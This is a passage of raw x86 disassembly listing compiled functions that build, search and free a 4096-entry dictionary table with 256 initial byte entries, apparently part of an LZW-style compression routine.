  40513f:	50                   	push   %eax
  405140:	e8 07 28 00 00       	call   0x40794c
  405145:	83 c4 04             	add    $0x4,%esp
  405148:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40514b:	51                   	push   %ecx
  40514c:	e8 2f d6 ff ff       	call   0x402780
  405151:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405154:	52                   	push   %edx
  405155:	e8 46 d6 ff ff       	call   0x4027a0
  40515a:	c7 05 a0 de 40 00 00 	movl   $0x0,0x40dea0
  405161:	00 00 00 
  405164:	33 c0                	xor    %eax,%eax
  405166:	8b e5                	mov    %ebp,%esp
  405168:	5d                   	pop    %ebp
  405169:	c2 04 00             	ret    $0x4
  40516c:	8f                   	(bad)
  40516d:	4e                   	dec    %esi
  40516e:	40                   	inc    %eax
  40516f:	00 d8                	add    %bl,%al
  405171:	4f                   	dec    %edi
  405172:	40                   	inc    %eax
  405173:	00 fc                	add    %bh,%ah
  405175:	4f                   	dec    %edi
  405176:	40                   	inc    %eax
  405177:	00 20                	add    %ah,(%eax)
  405179:	50                   	push   %eax
  40517a:	40                   	inc    %eax
  40517b:	00 44 50 40          	add    %al,0x40(%eax,%edx,2)
  40517f:	00 68 50             	add    %ch,0x50(%eax)
  405182:	40                   	inc    %eax
  405183:	00 8c 50 40 00 ad 50 	add    %cl,0x50ad0040(%eax,%edx,2)
  40518a:	40                   	inc    %eax
  40518b:	00 ce                	add    %cl,%dh
  40518d:	50                   	push   %eax
  40518e:	40                   	inc    %eax
  40518f:	00 f5                	add    %dh,%ch
  405191:	50                   	push   %eax
  405192:	40                   	inc    %eax
  405193:	00 22                	add    %ah,(%edx)
  405195:	51                   	push   %ecx
  405196:	40                   	inc    %eax
  405197:	00 2b                	add    %ch,(%ebx)
  405199:	51                   	push   %ecx
  40519a:	40                   	inc    %eax
  40519b:	00 00                	add    %al,(%eax)
  40519d:	0b 0b                	or     (%ebx),%ecx
  40519f:	0b 0b                	or     (%ebx),%ecx
  4051a1:	0b 0b                	or     (%ebx),%ecx
  4051a3:	0b 0b                	or     (%ebx),%ecx
  4051a5:	0b 0b                	or     (%ebx),%ecx
  4051a7:	0b 0b                	or     (%ebx),%ecx
  4051a9:	0b 0b                	or     (%ebx),%ecx
  4051ab:	01 02                	add    %eax,(%edx)
  4051ad:	03 04 05 06 07 0b 0b 	add    0xb0b0706(,%eax,1),%eax
  4051b4:	0b 0b                	or     (%ebx),%ecx
  4051b6:	0b 0b                	or     (%ebx),%ecx
  4051b8:	0b 0b                	or     (%ebx),%ecx
  4051ba:	0b 08                	or     (%eax),%ecx
  4051bc:	09 0b                	or     %ecx,(%ebx)
  4051be:	0b 0a                	or     (%edx),%ecx
  4051c0:	55                   	push   %ebp
  4051c1:	8b ec                	mov    %esp,%ebp
  4051c3:	51                   	push   %ecx
  4051c4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4051c7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051ca:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4051d0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4051d3:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4051da:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4051de:	74 08                	je     0x4051e8
  4051e0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4051e3:	e8 c8 00 00 00       	call   0x4052b0
  4051e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051eb:	8b e5                	mov    %ebp,%esp
  4051ed:	5d                   	pop    %ebp
  4051ee:	c2 04 00             	ret    $0x4
  4051f1:	cc                   	int3
  4051f2:	cc                   	int3
  4051f3:	cc                   	int3
  4051f4:	cc                   	int3
  4051f5:	cc                   	int3
  4051f6:	cc                   	int3
  4051f7:	cc                   	int3
  4051f8:	cc                   	int3
  4051f9:	cc                   	int3
  4051fa:	cc                   	int3
  4051fb:	cc                   	int3
  4051fc:	cc                   	int3
  4051fd:	cc                   	int3
  4051fe:	cc                   	int3
  4051ff:	cc                   	int3
  405200:	55                   	push   %ebp
  405201:	8b ec                	mov    %esp,%ebp
  405203:	51                   	push   %ecx
  405204:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405207:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40520a:	e8 11 00 00 00       	call   0x405220
  40520f:	8b e5                	mov    %ebp,%esp
  405211:	5d                   	pop    %ebp
  405212:	c3                   	ret
  405213:	cc                   	int3
  405214:	cc                   	int3
  405215:	cc                   	int3
  405216:	cc                   	int3
  405217:	cc                   	int3
  405218:	cc                   	int3
  405219:	cc                   	int3
  40521a:	cc                   	int3
  40521b:	cc                   	int3
  40521c:	cc                   	int3
  40521d:	cc                   	int3
  40521e:	cc                   	int3
  40521f:	cc                   	int3
  405220:	55                   	push   %ebp
  405221:	8b ec                	mov    %esp,%ebp
  405223:	83 ec 10             	sub    $0x10,%esp
  405226:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405229:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40522c:	83 38 00             	cmpl   $0x0,(%eax)
  40522f:	75 02                	jne    0x405233
  405231:	eb 6c                	jmp    0x40529f
  405233:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40523a:	eb 09                	jmp    0x405245
  40523c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40523f:	83 c1 01             	add    $0x1,%ecx
  405242:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405245:	81 7d fc 00 10 00 00 	cmpl   $0x1000,-0x4(%ebp)
  40524c:	7d 2a                	jge    0x405278
  40524e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405251:	8b 02                	mov    (%edx),%eax
  405253:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405256:	83 3c 88 00          	cmpl   $0x0,(%eax,%ecx,4)
  40525a:	74 1a                	je     0x405276
  40525c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40525f:	8b 02                	mov    (%edx),%eax
  405261:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405264:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  405267:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40526a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40526d:	50                   	push   %eax
  40526e:	e8 d9 26 00 00       	call   0x40794c
  405273:	83 c4 04             	add    $0x4,%esp
  405276:	eb c4                	jmp    0x40523c
  405278:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40527b:	8b 11                	mov    (%ecx),%edx
  40527d:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405280:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405283:	50                   	push   %eax
  405284:	e8 c3 26 00 00       	call   0x40794c
  405289:	83 c4 04             	add    $0x4,%esp
  40528c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40528f:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  405295:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405298:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  40529f:	8b e5                	mov    %ebp,%esp
  4052a1:	5d                   	pop    %ebp
  4052a2:	c3                   	ret
  4052a3:	cc                   	int3
  4052a4:	cc                   	int3
  4052a5:	cc                   	int3
  4052a6:	cc                   	int3
  4052a7:	cc                   	int3
  4052a8:	cc                   	int3
  4052a9:	cc                   	int3
  4052aa:	cc                   	int3
  4052ab:	cc                   	int3
  4052ac:	cc                   	int3
  4052ad:	cc                   	int3
  4052ae:	cc                   	int3
  4052af:	cc                   	int3
  4052b0:	55                   	push   %ebp
  4052b1:	8b ec                	mov    %esp,%ebp
  4052b3:	83 ec 18             	sub    $0x18,%esp
  4052b6:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4052b9:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4052bc:	e8 5f ff ff ff       	call   0x405220
  4052c1:	68 00 40 00 00       	push   $0x4000
  4052c6:	e8 8d 26 00 00       	call   0x407958
  4052cb:	83 c4 04             	add    $0x4,%esp
  4052ce:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4052d1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4052d4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4052d7:	89 08                	mov    %ecx,(%eax)
  4052d9:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4052e0:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4052e7:	eb 09                	jmp    0x4052f2
  4052e9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4052ec:	83 c2 01             	add    $0x1,%edx
  4052ef:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4052f2:	81 7d f8 00 10 00 00 	cmpl   $0x1000,-0x8(%ebp)
  4052f9:	7d 11                	jge    0x40530c
  4052fb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4052fe:	8b 08                	mov    (%eax),%ecx
  405300:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405303:	c7 04 91 00 00 00 00 	movl   $0x0,(%ecx,%edx,4)
  40530a:	eb dd                	jmp    0x4052e9
  40530c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  405313:	eb 09                	jmp    0x40531e
  405315:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405318:	83 c0 01             	add    $0x1,%eax
  40531b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40531e:	81 7d f4 ff 00 00 00 	cmpl   $0xff,-0xc(%ebp)
  405325:	7f 41                	jg     0x405368
  405327:	6a 03                	push   $0x3
  405329:	e8 2a 26 00 00       	call   0x407958
  40532e:	83 c4 04             	add    $0x4,%esp
  405331:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405334:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  405337:	8b 11                	mov    (%ecx),%edx
  405339:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40533c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40533f:	89 0c 82             	mov    %ecx,(%edx,%eax,4)
  405342:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405345:	8b 02                	mov    (%edx),%eax
  405347:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40534a:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  40534d:	b8 01 00 00 00       	mov    $0x1,%eax
  405352:	66 89 02             	mov    %ax,(%edx)
  405355:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  405358:	8b 11                	mov    (%ecx),%edx
  40535a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40535d:	8b 0c 82             	mov    (%edx,%eax,4),%ecx
  405360:	8a 55 f4             	mov    -0xc(%ebp),%dl
  405363:	88 51 02             	mov    %dl,0x2(%ecx)
  405366:	eb ad                	jmp    0x405315
  405368:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40536b:	c7 40 04 02 01 00 00 	movl   $0x102,0x4(%eax)
  405372:	8b e5                	mov    %ebp,%esp
  405374:	5d                   	pop    %ebp
  405375:	c3                   	ret
  405376:	cc                   	int3
  405377:	cc                   	int3
  405378:	cc                   	int3
  405379:	cc                   	int3
  40537a:	cc                   	int3
  40537b:	cc                   	int3
  40537c:	cc                   	int3
  40537d:	cc                   	int3
  40537e:	cc                   	int3
  40537f:	cc                   	int3
  405380:	55                   	push   %ebp
  405381:	8b ec                	mov    %esp,%ebp
  405383:	51                   	push   %ecx
  405384:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405387:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  40538b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40538e:	8b 11                	mov    (%ecx),%edx
  405390:	8b 04 82             	mov    (%edx,%eax,4),%eax
  405393:	8b e5                	mov    %ebp,%esp
  405395:	5d                   	pop    %ebp
  405396:	c2 04 00             	ret    $0x4
  405399:	cc                   	int3
  40539a:	cc                   	int3
  40539b:	cc                   	int3
  40539c:	cc                   	int3
  40539d:	cc                   	int3
  40539e:	cc                   	int3
  40539f:	cc                   	int3
  4053a0:	55                   	push   %ebp
  4053a1:	8b ec                	mov    %esp,%ebp
  4053a3:	83 ec 0c             	sub    $0xc,%esp
  4053a6:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4053a9:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  4053ad:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4053b0:	8b 11                	mov    (%ecx),%edx
  4053b2:	83 3c 82 00          	cmpl   $0x0,(%edx,%eax,4)
  4053b6:	74 1b                	je     0x4053d3
  4053b8:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  4053bc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4053bf:	8b 11                	mov    (%ecx),%edx
  4053c1:	8b 04 82             	mov    (%edx,%eax,4),%eax
  4053c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4053c7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4053ca:	51                   	push   %ecx
  4053cb:	e8 7c 25 00 00       	call   0x40794c
  4053d0:	83 c4 04             	add    $0x4,%esp
  4053d3:	8b 55 10             	mov    0x10(%ebp),%edx
  4053d6:	83 c2 02             	add    $0x2,%edx
  4053d9:	52                   	push   %edx
  4053da:	e8 79 25 00 00       	call   0x407958
  4053df:	83 c4 04             	add    $0x4,%esp
  4053e2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4053e5:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  4053e9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4053ec:	8b 11                	mov    (%ecx),%edx
  4053ee:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4053f1:	89 0c 82             	mov    %ecx,(%edx,%eax,4)
  4053f4:	0f b7 55 08          	movzwl 0x8(%ebp),%edx
  4053f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4053fb:	8b 08                	mov    (%eax),%ecx
  4053fd:	8b 14 91             	mov    (%ecx,%edx,4),%edx
  405400:	66 8b 45 10          	mov    0x10(%ebp),%ax
  405404:	66 89 02             	mov    %ax,(%edx)
  405407:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40540a:	51                   	push   %ecx
  40540b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40540e:	52                   	push   %edx
  40540f:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  405413:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405416:	8b 11                	mov    (%ecx),%edx
  405418:	8b 04 82             	mov    (%edx,%eax,4),%eax
  40541b:	83 c0 02             	add    $0x2,%eax
  40541e:	50                   	push   %eax
  40541f:	e8 2e 25 00 00       	call   0x407952
  405424:	83 c4 0c             	add    $0xc,%esp
  405427:	8b e5                	mov    %ebp,%esp
  405429:	5d                   	pop    %ebp
  40542a:	c2 0c 00             	ret    $0xc
  40542d:	cc                   	int3
  40542e:	cc                   	int3
  40542f:	cc                   	int3
  405430:	55                   	push   %ebp
  405431:	8b ec                	mov    %esp,%ebp
  405433:	51                   	push   %ecx
  405434:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405437:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40543b:	74 0a                	je     0x405447
  40543d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405440:	e8 5b 01 00 00       	call   0x4055a0
  405445:	eb 1d                	jmp    0x405464
  405447:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40544a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405450:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405453:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  40545a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40545d:	c7 42 0c 00 00 00 00 	movl   $0x0,0xc(%edx)
  405464:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405467:	8b e5                	mov    %ebp,%esp
  405469:	5d                   	pop    %ebp
  40546a:	c2 04 00             	ret    $0x4
  40546d:	cc                   	int3
  40546e:	cc                   	int3
  40546f:	cc                   	int3
  405470:	55                   	push   %ebp
  405471:	8b ec                	mov    %esp,%ebp
  405473:	51                   	push   %ecx
  405474:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405477:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40547a:	e8 11 00 00 00       	call   0x405490
  40547f:	8b e5                	mov    %ebp,%esp
  405481:	5d                   	pop    %ebp
  405482:	c3                   	ret
  405483:	cc                   	int3
  405484:	cc                   	int3
  405485:	cc                   	int3
  405486:	cc                   	int3
  405487:	cc                   	int3
  405488:	cc                   	int3
  405489:	cc                   	int3
  40548a:	cc                   	int3
  40548b:	cc                   	int3
  40548c:	cc                   	int3
  40548d:	cc                   	int3
  40548e:	cc                   	int3
  40548f:	cc                   	int3
  405490:	55                   	push   %ebp
  405491:	8b ec                	mov    %esp,%ebp
  405493:	83 ec 08             	sub    $0x8,%esp
  405496:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405499:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40549c:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4054a0:	75 02                	jne    0x4054a4
  4054a2:	eb 2c                	jmp    0x4054d0
  4054a4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4054a7:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4054ad:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4054b4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4054b7:	83 7a 0c 00          	cmpl   $0x0,0xc(%edx)
  4054bb:	74 13                	je     0x4054d0
  4054bd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4054c0:	e8 1b 00 00 00       	call   0x4054e0
  4054c5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4054c8:	83 c0 01             	add    $0x1,%eax
  4054cb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4054ce:	eb e4                	jmp    0x4054b4
  4054d0:	8b e5                	mov    %ebp,%esp
  4054d2:	5d                   	pop    %ebp
  4054d3:	c3                   	ret
  4054d4:	cc                   	int3
  4054d5:	cc                   	int3
  4054d6:	cc                   	int3
  4054d7:	cc                   	int3
  4054d8:	cc                   	int3
  4054d9:	cc                   	int3
  4054da:	cc                   	int3
  4054db:	cc                   	int3
  4054dc:	cc                   	int3
  4054dd:	cc                   	int3
  4054de:	cc                   	int3
  4054df:	cc                   	int3
  4054e0:	55                   	push   %ebp
  4054e1:	8b ec                	mov    %esp,%ebp
  4054e3:	83 ec 10             	sub    $0x10,%esp
  4054e6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4054e9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4054ec:	8b 48 0c             	mov    0xc(%eax),%ecx
  4054ef:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4054f2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4054f5:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  4054f9:	74 49                	je     0x405544
  4054fb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4054fe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405501:	8b 51 04             	mov    0x4(%ecx),%edx
  405504:	89 50 0c             	mov    %edx,0xc(%eax)
  405507:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40550a:	8b 48 0c             	mov    0xc(%eax),%ecx
  40550d:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  405511:	74 20                	je     0x405533
  405513:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405516:	8b 42 0c             	mov    0xc(%edx),%eax
  405519:	50                   	push   %eax
  40551a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40551d:	e8 4e 00 00 00       	call   0x405570
  405522:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405525:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405528:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40552b:	8b 42 08             	mov    0x8(%edx),%eax
  40552e:	89 41 08             	mov    %eax,0x8(%ecx)
  405531:	eb 0f                	jmp    0x405542
  405533:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405536:	8b 51 0c             	mov    0xc(%ecx),%edx
  405539:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40553c:	8b 48 08             	mov    0x8(%eax),%ecx
  40553f:	89 4a 08             	mov    %ecx,0x8(%edx)
  405542:	eb 0c                	jmp    0x405550
  405544:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405547:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40554a:	8b 48 08             	mov    0x8(%eax),%ecx
  40554d:	89 4a 0c             	mov    %ecx,0xc(%edx)
  405550:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405553:	89 55 f4             	mov    %edx,-0xc(%ebp)
  405556:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405559:	50                   	push   %eax
  40555a:	e8 ed 23 00 00       	call   0x40794c
  40555f:	83 c4 04             	add    $0x4,%esp
  405562:	8b e5                	mov    %ebp,%esp
  405564:	5d                   	pop    %ebp
  405565:	c3                   	ret
  405566:	cc                   	int3
  405567:	cc                   	int3
  405568:	cc                   	int3
  405569:	cc                   	int3
  40556a:	cc                   	int3
  40556b:	cc                   	int3
  40556c:	cc                   	int3
  40556d:	cc                   	int3
  40556e:	cc                   	int3
  40556f:	cc                   	int3
  405570:	55                   	push   %ebp
  405571:	8b ec                	mov    %esp,%ebp
  405573:	83 ec 08             	sub    $0x8,%esp
  405576:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405579:	8b 45 08             	mov    0x8(%ebp),%eax
  40557c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40557f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405582:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  405586:	74 0b                	je     0x405593
  405588:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40558b:	8b 42 08             	mov    0x8(%edx),%eax
  40558e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405591:	eb ec                	jmp    0x40557f
  405593:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405596:	8b e5                	mov    %ebp,%esp
  405598:	5d                   	pop    %ebp
  405599:	c2 04 00             	ret    $0x4
  40559c:	cc                   	int3
  40559d:	cc                   	int3
  40559e:	cc                   	int3
  40559f:	cc                   	int3
  4055a0:	55                   	push   %ebp
  4055a1:	8b ec                	mov    %esp,%ebp
  4055a3:	83 ec 1c             	sub    $0x1c,%esp
  4055a6:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4055a9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4055ac:	e8 df fe ff ff       	call   0x405490
  4055b1:	6a 0c                	push   $0xc
  4055b3:	e8 a0 23 00 00       	call   0x407958
  4055b8:	83 c4 04             	add    $0x4,%esp
  4055bb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4055be:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4055c1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4055c4:	33 c9                	xor    %ecx,%ecx
  4055c6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4055c9:	66 89 4a 02          	mov    %cx,0x2(%edx)
  4055cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4055d0:	c6 00 00             	movb   $0x0,(%eax)
  4055d3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4055d6:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4055dd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4055e0:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  4055e7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4055ea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4055ed:	89 48 0c             	mov    %ecx,0xc(%eax)
  4055f0:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4055f3:	c7 42 10 00 00 00 00 	movl   $0x0,0x10(%edx)
  4055fa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4055fd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405600:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  405607:	eb 09                	jmp    0x405612
  405609:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40560c:	83 c1 01             	add    $0x1,%ecx
  40560f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405612:	81 7d f4 ff 00 00 00 	cmpl   $0xff,-0xc(%ebp)
  405619:	7f 4b                	jg     0x405666
  40561b:	6a 0c                	push   $0xc
  40561d:	e8 36 23 00 00       	call   0x407958
  405622:	83 c4 04             	add    $0x4,%esp
  405625:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405628:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40562b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40562e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405631:	66 8b 4d f4          	mov    -0xc(%ebp),%cx
  405635:	66 89 48 02          	mov    %cx,0x2(%eax)
  405639:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40563c:	8a 45 f4             	mov    -0xc(%ebp),%al
  40563f:	88 02                	mov    %al,(%edx)
  405641:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405644:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  40564b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40564e:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  405655:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405658:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40565b:	89 48 08             	mov    %ecx,0x8(%eax)
  40565e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405661:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405664:	eb a3                	jmp    0x405609
  405666:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405669:	c7 00 02 01 00 00    	movl   $0x102,(%eax)
  40566f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  405672:	c7 41 04 02 01 00 00 	movl   $0x102,0x4(%ecx)
  405679:	8b e5                	mov    %ebp,%esp
  40567b:	5d                   	pop    %ebp
  40567c:	c3                   	ret
  40567d:	cc                   	int3
  40567e:	cc                   	int3
  40567f:	cc                   	int3
  405680:	55                   	push   %ebp
  405681:	8b ec                	mov    %esp,%ebp
  405683:	83 ec 08             	sub    $0x8,%esp
  405686:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405689:	8b 45 0c             	mov    0xc(%ebp),%eax
  40568c:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  405690:	75 04                	jne    0x405696
  405692:	33 c0                	xor    %eax,%eax
  405694:	eb 2f                	jmp    0x4056c5
  405696:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405699:	8b 51 04             	mov    0x4(%ecx),%edx
  40569c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40569f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4056a3:	74 1e                	je     0x4056c3
  4056a5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056a8:	0f b6 08             	movzbl (%eax),%ecx
  4056ab:	0f b6 55 08          	movzbl 0x8(%ebp),%edx
  4056af:	3b ca                	cmp    %edx,%ecx
  4056b1:	75 05                	jne    0x4056b8
  4056b3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056b6:	eb 0d                	jmp    0x4056c5
  4056b8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056bb:	8b 48 08             	mov    0x8(%eax),%ecx
  4056be:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4056c1:	eb dc                	jmp    0x40569f
  4056c3:	33 c0                	xor    %eax,%eax
  4056c5:	8b e5                	mov    %ebp,%esp
  4056c7:	5d                   	pop    %ebp
  4056c8:	c2 08 00             	ret    $0x8
  4056cb:	cc                   	int3
  4056cc:	cc                   	int3
  4056cd:	cc                   	int3
  4056ce:	cc                   	int3
  4056cf:	cc                   	int3
  4056d0:	55                   	push   %ebp
  4056d1:	8b ec                	mov    %esp,%ebp
  4056d3:	83 ec 14             	sub    $0x14,%esp
  4056d6:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4056d9:	6a 0c                	push   $0xc
  4056db:	e8 78 22 00 00       	call   0x407958
  4056e0:	83 c4 04             	add    $0x4,%esp
  4056e3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4056e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4056e9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056ec:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4056f0:	75 07                	jne    0x4056f9
  4056f2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4056f9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056fc:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  405703:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405706:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  40570d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405710:	8a 4d 08             	mov    0x8(%ebp),%cl
  405713:	88 08                	mov    %cl,(%eax)
  405715:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405718:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40571b:	66 8b 48 04          	mov    0x4(%eax),%cx
  40571f:	66 89 4a 02          	mov    %cx,0x2(%edx)
  405723:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405726:	0f b7 42 02          	movzwl 0x2(%edx),%eax
  40572a:	3d 00 01 00 00       	cmp    $0x100,%eax
  40572f:	75 07                	jne    0x405738
